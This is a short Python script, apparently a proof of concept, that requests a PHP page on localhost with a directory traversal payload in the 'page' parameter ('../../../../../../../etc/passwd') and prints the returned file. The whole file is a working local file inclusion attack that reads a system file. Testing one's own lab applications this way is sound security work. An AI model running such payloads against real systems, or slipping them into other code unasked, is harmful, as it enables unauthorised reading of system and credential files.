import requests

def main():
	try:
		response = requests.get("http://localhost:8080/index.php?page=../../../../../../../etc/passwd")
		response.raise_for_status()
		print(response.text)
		# print("-" * 50)
		# print(response._content)
	except Exception as e:
		print(f"error: {e}")

if __name__ == "__main__":
	main()